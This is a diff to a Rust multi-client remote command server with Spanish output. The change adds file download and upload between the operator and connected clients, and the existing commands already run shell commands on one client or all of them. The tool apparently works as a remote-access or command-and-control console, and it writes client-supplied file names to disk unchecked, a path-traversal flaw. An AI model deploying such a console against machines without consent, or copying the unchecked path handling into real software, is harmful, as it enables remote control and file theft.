@@ -9,6 +9,7 @@ use clap::Parser;
 use chrono::Local;
 use colored::*;
 use prettytable::{Table, Row, Cell, format};
+use std::fs;
 
 type ClientId = u64;
 
@@ -221,16 +222,45 @@ async fn handle_client(
                     if command_buffer.contains(DELIMITER) {
                         let response = command_buffer.replace(DELIMITER, "").trim().to_string();
                         if !response.is_empty() {
-                            println!();
-                            println!("{} {} {}", 
-                                "📨".bright_blue(), 
-                                "Respuesta de".bright_white().bold(),
-                                format!("[{}]:", id).bright_cyan().bold()
-                            );
-                            println!("{}", "─".repeat(60).bright_black());
-                            println!("{}", response);
-                            println!("{}", "─".repeat(60).bright_black());
-                            println!();
+                            // Verificar si es una respuesta de file transfer
+                            if response.starts_with("__FILE__:") {
+                                handle_file_download(&response, id, verbose);
+                            } else if response.starts_with("__ERROR__:") {
+                                let error = response.strip_prefix("__ERROR__:").unwrap_or(&response);
+                                println!();
+                                println!("{} {} {}", 
+                                    "❌".bright_red(), 
+                                    "Error de".bright_white().bold(),
+                                    format!("[{}]:", id).bright_cyan().bold()
+                                );
+                                println!("{}", "─".repeat(60).bright_black());
+                                println!("{}", error.bright_red());
+                                println!("{}", "─".repeat(60).bright_black());
+                                println!();
+                            } else if response.starts_with("__SUCCESS__:") {
+                                let msg = response.strip_prefix("__SUCCESS__:").unwrap_or(&response);
+                                println!();
+                                println!("{} {} {}", 
+                                    "✅".bright_green(), 
+                                    "Éxito de".bright_white().bold(),
+                                    format!("[{}]:", id).bright_cyan().bold()
+                                );
+                                println!("{}", "─".repeat(60).bright_black());
+                                println!("{}", msg.bright_green());
+                                println!("{}", "─".repeat(60).bright_black());
+                                println!();
+                            } else {
+                                println!();
+                                println!("{} {} {}", 
+                                    "📨".bright_blue(), 
+                                    "Respuesta de".bright_white().bold(),
+                                    format!("[{}]:", id).bright_cyan().bold()
+                                );
+                                println!("{}", "─".repeat(60).bright_black());
+                                println!("{}", response);
+                                println!("{}", "─".repeat(60).bright_black());
+                                println!();
+                            }
                         }
                         command_buffer.clear();
                     }
@@ -254,6 +284,119 @@ async fn handle_client(
     // Limpiar cliente
     clients.lock().unwrap().remove(&id);
     println!("❌ Cliente [{}] desconectado", id);
+}
+
+fn handle_file_download(response: &str, client_id: ClientId, verbose: bool) {
+    // Formato: __FILE__:nombre_archivo:tamaño:datos_base64
+    let parts: Vec<&str> = response.splitn(4, ':').collect();
+    
+    if parts.len() != 4 {
+        eprintln!("{} Formato de archivo inválido", "❌".bright_red());
+        return;
+    }
+    
+    let file_name = parts[1];
+    let file_size = parts[2];
+    let encoded_data = parts[3];
+    
+    if verbose {
+        println!("{} Decodificando {} bytes de base64...", "🔄".bright_yellow(), encoded_data.len());
+    }
+    
+    match base64_decode(encoded_data) {
+        Ok(file_data) => {
+            let save_path = format!("downloads/{}", file_name);
+            
+            // Crear directorio downloads si no existe
+            if let Err(e) = fs::create_dir_all("downloads") {
+                eprintln!("{} Error creando directorio downloads: {}", "❌".bright_red(), e);
+                return;
+            }
+            
+            match fs::write(&save_path, file_data) {
+                Ok(_) => {
+                    println!();
+                    println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_green());
+                    println!("{}", format!("║              📥 ARCHIVO DESCARGADO [{}]", client_id).bright_green().bold());
+                    println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_green());
+                    println!();
+                    println!("  {} {}", "📄 Archivo:".bright_cyan().bold(), file_name.bright_white());
+                    println!("  {} {}", "📊 Tamaño:".bright_cyan().bold(), format!("{} bytes", file_size).bright_white());
+                    println!("  {} {}", "💾 Guardado:".bright_cyan().bold(), save_path.bright_white());
+                    println!();
+                }
+                Err(e) => {
+                    eprintln!("{} Error guardando archivo: {}", "❌".bright_red(), e);
+                }
+            }
+        }
+        Err(e) => {
+            eprintln!("{} Error decodificando base64: {}", "❌".bright_red(), e);
+        }
+    }
+}
+
+fn base64_decode(data: &str) -> Result<Vec<u8>, String> {
+    let data = data.trim();
+    let mut result = Vec::new();
+    
+    let decode_char = |c: char| -> Result<u8, String> {
+        match c {
+            'A'..='Z' => Ok(c as u8 - b'A'),
+            'a'..='z' => Ok(c as u8 - b'a' + 26),
+            '0'..='9' => Ok(c as u8 - b'0' + 52),
+            '+' => Ok(62),
+            '/' => Ok(63),
+            '=' => Ok(0),
+            _ => Err(format!("Carácter inválido en base64: {}", c)),
+        }
+    };
+    
+    let chars: Vec<char> = data.chars().collect();
+    for chunk in chars.chunks(4) {
+        if chunk.len() != 4 {
+            continue;
+        }
+        
+        let b1 = decode_char(chunk[0])?;
+        let b2 = decode_char(chunk[1])?;
+        let b3 = decode_char(chunk[2])?;
+        let b4 = decode_char(chunk[3])?;
+        
+        result.push((b1 << 2) | (b2 >> 4));
+        if chunk[2] != '=' {
+            result.push((b2 << 4) | (b3 >> 2));
+        }
+        if chunk[3] != '=' {
+            result.push((b3 << 6) | b4);
+        }
+    }
+    
+    Ok(result)
+}
+
+fn base64_encode(data: &[u8]) -> String {
+    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    let mut result = String::new();
+    
+    for chunk in data.chunks(3) {
+        let mut buf = [0u8; 3];
+        for (i, &byte) in chunk.iter().enumerate() {
+            buf[i] = byte;
+        }
+        
+        let b1 = (buf[0] >> 2) & 0x3F;
+        let b2 = ((buf[0] & 0x03) << 4) | ((buf[1] >> 4) & 0x0F);
+        let b3 = ((buf[1] & 0x0F) << 2) | ((buf[2] >> 6) & 0x03);
+        let b4 = buf[2] & 0x3F;
+        
+        result.push(CHARS[b1 as usize] as char);
+        result.push(CHARS[b2 as usize] as char);
+        result.push(if chunk.len() > 1 { CHARS[b3 as usize] as char } else { '=' });
+        result.push(if chunk.len() > 2 { CHARS[b4 as usize] as char } else { '=' });
+    }
+    
+    result
 }
 
 #[tokio::main]
@@ -332,6 +475,8 @@ async fn main() {
                     println!("  {} {:<20} {}", "🎯".bright_green(), "/select <id>", "Selecciona un cliente por ID".bright_white());
                     println!("  {} {:<20} {}", "📤".bright_blue(), "/cmd <comando>", "Envía comando al cliente seleccionado".bright_white());
                     println!("  {} {:<20} {}", "📡".bright_magenta(), "/cmd_all <cmd>", "Envía comando a TODOS los clientes".bright_white());
+                    println!("  {} {:<20} {}", "📥".bright_cyan(), "/download <ruta>", "Descarga archivo desde el cliente".bright_white());
+                    println!("  {} {:<20} {}", "📤".bright_green(), "/upload <local> <remoto>", "Sube archivo al cliente".bright_white());
                     println!("  {} {:<20} {}", "ℹ️ ".bright_cyan(), "/info <id>", "Muestra info detallada de un cliente".bright_white());
                     println!("  {} {:<20} {}", "🔄".bright_yellow(), "/deselect", "Deselecciona el cliente actual".bright_white());
                     println!("  {} {:<20} {}", "👋".bright_red(), "/exit, /quit", "Cierra el servidor".bright_white());
@@ -439,6 +584,81 @@ async fn main() {
                 "/deselect" => {
                     *selected_client.lock().unwrap() = None;
                     println!("{}", "✅ Cliente deseleccionado".bright_green());
+                }
+                "/download" => {
+                    if parts.len() < 2 {
+                        println!("{} /download <ruta_remota>", "❌ Uso:".bright_red());
+                        continue;
+                    }
+                    
+                    let remote_path = parts[1..].join(" ");
+                    let selected = *selected_client.lock().unwrap();
+                    
+                    if let Some(id) = selected {
+                        let clients = clients.lock().unwrap();
+                        
+                        if let Some(client) = clients.get(&id) {
+                            let command = format!("__DOWNLOAD__:{}", remote_path);
+                            if let Err(e) = client.tx.send(command) {
+                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
+                            } else {
+                                println!("{} Solicitando descarga de: {}", 
+                                    "📥".bright_cyan(), 
+                                    remote_path.bright_white()
+                                );
+                            }
+                        } else {
+                            println!("{} Cliente {} desconectado", "❌".bright_red(), id);
+                            *selected_client.lock().unwrap() = None;
+                        }
+                    } else {
+                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
+                }
+                "/upload" => {
+                    if parts.len() < 3 {
+                        println!("{} /upload <archivo_local> <ruta_remota>", "❌ Uso:".bright_red());
+                        continue;
+                    }
+                    
+                    let local_path = parts[1];
+                    let remote_path = parts[2..].join(" ");
+                    let selected = *selected_client.lock().unwrap();
+                    
+                    if let Some(id) = selected {
+                        // Leer archivo local
+                        match fs::read(local_path) {
+                            Ok(file_data) => {
+                                let encoded = base64_encode(&file_data);
+                                let command = format!("__UPLOAD__:{}:{}", remote_path, encoded);
+                                
+                                let clients = clients.lock().unwrap();
+                                if let Some(client) = clients.get(&id) {
+                                    if let Err(e) = client.tx.send(command) {
+                                        println!("{} {}", "❌ Error:".bright_red().bold(), e);
+                                    } else {
+                                        println!();
+                                        println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_cyan());
+                                        println!("{}", format!("║              📤 SUBIENDO ARCHIVO [{}]", id).bright_cyan().bold());
+                                        println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_cyan());
+                                        println!();
+                                        println!("  {} {}", "📄 Local:".bright_green().bold(), local_path.bright_white());
+                                        println!("  {} {}", "🎯 Remoto:".bright_green().bold(), remote_path.bright_white());
+                                        println!("  {} {}", "📊 Tamaño:".bright_green().bold(), format!("{} bytes", file_data.len()).bright_white());
+                                        println!();
+                                    }
+                                } else {
+                                    println!("{} Cliente {} desconectado", "❌".bright_red(), id);
+                                    *selected_client.lock().unwrap() = None;
+                                }
+                            }
+                            Err(e) => {
+                                println!("{} Error leyendo archivo local: {}", "❌".bright_red(), e);
+                            }
+                        }
+                    } else {
+                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
                 }
                 "/cmd" => {
                     if parts.len() < 2 {
